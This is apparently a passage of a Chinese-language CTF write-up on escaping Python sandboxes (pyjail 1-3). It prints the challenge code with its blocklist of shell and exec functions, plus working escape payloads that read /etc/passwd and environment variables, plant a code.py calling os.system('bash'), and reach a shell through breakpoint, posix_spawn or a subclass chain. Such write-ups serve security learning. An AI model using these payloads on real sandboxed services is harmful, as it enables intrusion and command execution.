+<span class="n">input_code</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Can u input your code to escape &gt; </span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">blacklist_words</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="sh">"</span><span class="s">subprocess</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">interact</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">pty</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">pdb</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">platform</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">importlib</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">timeit</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">imp</span><span class="sh">"</span><span class="p">,</span> 
+    <span class="sh">"</span><span class="s">commands</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">popen</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">load_module</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">spawn</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">compile</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">vars</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">attr</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">dir</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">getattr</span><span class="sh">"</span>
+    <span class="sh">"</span><span class="s">__import__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__getattribute__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__base__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__subclasses__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__getitem__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__self__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__globals__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__init__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__name__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">__dict__</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">._module</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">builtins</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">breakpoint</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">import</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">blacklist_words</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">input_code</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">while</span> <span class="sh">'</span><span class="s">{</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="n">input_code</span><span class="p">.</span><span class="nf">isascii</span><span class="p">()</span> <span class="ow">and</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">65</span><span class="p">:</span>
+    <span class="n">input_code</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">f</span><span class="sh">'</span><span class="si">{</span><span class="n">input_code</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! Please obey the filter rules which I set!</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>题目主要设置了几个防护：</p>
+<ol>
+  <li>将一些敏感函数使用 blacklist_fun_callback 进行覆盖。
+    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+</code></pre></div>    </div>
+  </li>
+  <li>将一些 builtins 中的函数进行覆盖：
+    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+     <span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+</code></pre></div>    </div>
+  </li>
+  <li>删除了 os, subprocess, code, pty 库。</li>
+  <li>设置了一个黑名单 blacklist_words，过滤了一些敏感的函数名，但没有过滤 open、write 等文件操作函数。（help 也没有过滤，但进入文档后无法输入 :）</li>
+  <li>控制输入的长度为 65 以下，并且只能输入 ascii 字符，unicode 就用不了了。</li>
+  <li>最后通过 f string 来执行代码。</li>
+</ol>
+
+<p>由于没有过滤 open 函数，我们可以直接读取文件内容：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/etc/passwd</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">())}</span>
+</code></pre></div></div>
+<p>读取 /proc/self/environ 时可以读取到 flag。</p>
+
+<h2 id="pyjail2">pyjail2</h2>
+<h3 id="解法-1写文件">解法 1：写文件</h3>
+<p>pyjail2 的源代码没有变，但 flag 值不在 /proc/self/environ 中了。由于 write 函数没有被过滤，我们可以先写入一个 python 文件，然后加载该文件来 getshell。</p>
+
+<p>由于脚本本身加载了 code 模块，我们在当前目录写一个 code.py，再次运行该脚本时，就会加载我们写入的 code.py，如果我们写入下面的内容，就可以直接获取 shell。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">"bash"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>由于限制了输入长度不能够超过 64，因此我们需要切分写入，例如：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"w"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"__im"</span><span class="o">)}</span>
+<span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"a"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"port_"</span><span class="o">)}</span>
+</code></pre></div></div>
+<p>注意，当我们需要写入含有单引号的字符时，如果直接使用 <code class="language-plaintext highlighter-rouge">{open("a","a").write("_('o")}</code> 会出现报错:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Traceback </span><span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span>
+    <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
+                              <span class="o">^</span>
+<span class="nb">SyntaxError</span><span class="p">:</span> <span class="n">unterminated</span> <span class="n">string</span> <span class="nf">literal </span><span class="p">(</span><span class="n">detected</span> <span class="n">at</span> <span class="n">line</span> <span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+<p>这是由于经过外层的 f string 之后，eval 执行的是如下的字符串，由于单引号没有闭合，所以无法执行，但我们加入反斜杠后，又会出现下面的错误，f-string 表达式部分不能包含反斜杠。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="o">-</span><span class="n">string</span> <span class="n">expression</span> <span class="n">part</span> <span class="n">cannot</span> <span class="n">include</span> <span class="n">a</span> <span class="n">backslash</span>
+</code></pre></div></div>
+<p>但实际我们可以直接闭合掉两头的字符串，避免受到 f-string 的限制：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">输入</span><span class="err">：</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="s">),</span><span class="sh">'</span><span class="s">
+拼接后为：eval(</span><span class="sh">'</span><span class="s">f</span><span class="se">\'\'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span>\<span class="sh">'"</span><span class="s">),</span><span class="se">\'\'</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>将 payload 写入文件 a 后，可以将内容写入 code.py，由于 code 也被过滤了，所以可以通过字符串拼接来绕过：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
+</code></pre></div></div>
+<p>写入 code.py 后，再加载一次即可进入 bash。</p>
+
+<p>完整 exp：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">__im</span><span class="sh">"</span><span class="p">)}</span>
+<span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">port_</span><span class="sh">"</span><span class="p">)}</span>
+<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">_(</span><span class="sh">'</span><span class="n">o</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span><span class="s">
+{1}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span><span class="sh">'</span><span class="s">).syste</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
+<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">m(</span><span class="sh">'</span><span class="n">bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
+<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h3 id="解法-2清空-blacklist_words">解法 2：清空 blacklist_words</h3>
+<p>该利用手法的思路如果：</p>
+<ol>
+  <li>将 blacklist_words 置空，然后利用 input() 来绕过长度限制进一步输入内容。</li>
+  <li>利用 globals()[<strong>builtins</strong>] 获取到内置模块，从而获取原始的内置函数。</li>
+</ol>
+
+<p>具体可参考文章：<a href="http://cn-sec.com/archives/2313588.html">2023 强网杯 Writeup - CN-SEC 中文网</a></p>
+
+<p>全局变量 blacklist_words 可以通过 globals() 获取，下面的 payload 即可将该全局变量清空：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">()</span>
+</code></pre></div></div>
+<p>清空之后，就可以使用黑名单的函数了，但由于长度限制，我们可以使得 eval 执行后返回 {input()}，例如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{[</span><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">(),</span><span class="sh">"</span><span class="s">(inpu</span><span class="sh">""</span><span class="s">t())}</span><span class="sh">"</span><span class="p">][</span><span class="mi">1</span><span class="p">]}</span>
+<span class="c1"># input_code = eval(f"f'{input_code}'") 后可以得到 {input()}
+</span></code></pre></div></div>
+<p>由于 while 循环的存在，会再次进入 eval，执行 eval(“f’{input()}’”) 会打开输入。</p>
+
+<p>由于 blacklist_fun_callback 仅仅覆盖的是当前命名空间中的 breakpoint 函数，我们可以通过 <code class="language-plaintext highlighter-rouge">globals()["__builtins__"]</code> 获取到原始的 builtins 函数。因此我们再传入下面的 payload 即可打开 breakpoint 的 Pdb 交互式命令行.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">].</span><span class="nf">breakpoint</span><span class="p">()}</span>
+</code></pre></div></div>
+<p>进入命令行后，可以通过 os.listdir 或者 glob.glob 方法列目录。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">listdir</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>另外，os 模块除了 system 以外，还有别的模块也是可以 getshell 的，比如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="nf">posix_spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">],</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">)</span>
+</code></pre></div></div>
+<p>方法多多，具体可参考我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/29/python-沙箱逃逸原理.html">CTF Pyjail 沙箱逃逸原理合集</a></p>
+
+<h2 id="pyjail3">pyjail3</h2>
+<p>这道题涉及到了 AST 绕过，但限制非常死，源码如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">ast</span>
+
+<span class="n">BAD_ATS</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Attribute</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Subscript</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">comprehension</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Delete</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Try</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">For</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">ExceptHandler</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">With</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Import</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">ImportFrom</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Assign</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">AnnAssign</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">Constant</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">ClassDef</span><span class="p">,</span>
+  <span class="n">ast</span><span class="p">.</span><span class="n">AsyncFunctionDef</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">BUILTINS</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">bool</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">set</span><span class="sh">"</span><span class="p">:</span> <span class="nb">set</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">tuple</span><span class="sh">"</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">round</span><span class="sh">"</span><span class="p">:</span> <span class="nb">round</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">map</span><span class="sh">"</span><span class="p">:</span> <span class="nb">map</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">len</span><span class="sh">"</span><span class="p">:</span> <span class="nb">len</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">bytes</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">dict</span><span class="sh">"</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">str</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">all</span><span class="sh">"</span><span class="p">:</span> <span class="nb">all</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">enumerate</span><span class="sh">"</span><span class="p">:</span> <span class="nb">enumerate</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">int</span><span class="sh">"</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">zip</span><span class="sh">"</span><span class="p">:</span> <span class="nb">zip</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">filter</span><span class="sh">"</span><span class="p">:</span> <span class="nb">filter</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">list</span><span class="sh">"</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">max</span><span class="sh">"</span><span class="p">:</span> <span class="nb">max</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">float</span><span class="sh">"</span><span class="p">:</span> <span class="nb">float</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">divmod</span><span class="sh">"</span><span class="p">:</span> <span class="nb">divmod</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">unicode</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">min</span><span class="sh">"</span><span class="p">:</span> <span class="nb">min</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">sum</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sum</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">abs</span><span class="sh">"</span><span class="p">:</span> <span class="nb">abs</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">sorted</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sorted</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">repr</span><span class="sh">"</span><span class="p">:</span> <span class="nb">repr</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">object</span><span class="sh">"</span><span class="p">:</span> <span class="nb">object</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">isinstance</span><span class="sh">"</span><span class="p">:</span> <span class="nb">isinstance</span>
+<span class="p">}</span>
+
+
+
+<span class="k">def</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+  <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">__</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="nf">compile</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">&lt;QWB7th&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">ast</span><span class="p">.</span><span class="n">PyCF_ONLY_AST</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">in</span> <span class="n">BAD_ATS</span><span class="p">:</span>
+      <span class="k">return</span> <span class="bp">False</span>
+
+  <span class="k">return</span> <span class="bp">True</span>  
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+  <span class="n">user_input</span> <span class="o">=</span> <span class="sh">""</span>
+  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="nf">input</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="sh">""</span><span class="p">:</span>
+      <span class="k">break</span>
+    <span class="n">user_input</span> <span class="o">+=</span> <span class="n">line</span>
+    <span class="n">user_input</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>
+
+  <span class="k">if</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1800</span><span class="p">:</span>
+    <span class="nf">exec</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">:</span> <span class="n">BUILTINS</span><span class="p">},</span> <span class="p">{})</span>
+</code></pre></div></div>
+<p>BAD_ATS 过滤了非常多的 AST 类型，其中影响比较大的是下面的这几个：</p>
+<ul>
+  <li>ast.Attribute：最为致命，意味着 . 号获取属性无法使用。</li>
+  <li>ast.Constant：无法使用常量，但我们可以通过函数来获取常量，例如 str(len[[]])=’0’</li>
+  <li>ast.Subscript：无法使用索引、切片等。</li>
+  <li>ast.ClassDef：不能够定义类。</li>
+  <li>ast.For：不能使用 for 循环</li>
+</ul>
+
+<p>BUILTINS 中能够使用的函数都不具备 RCE 或者操作文件系统的功能，那么我们的思路就是绕过 no builtins。</p>
+
+<p>构造:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astattribute-获取属性">绕过 ast.Attribute 获取属性</h3>
+<p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
+
+<p>最简单的示例，匹配字符串：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="mi">2</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
+    <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">One</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Two</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Two
+</span></code></pre></div></div>
+<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
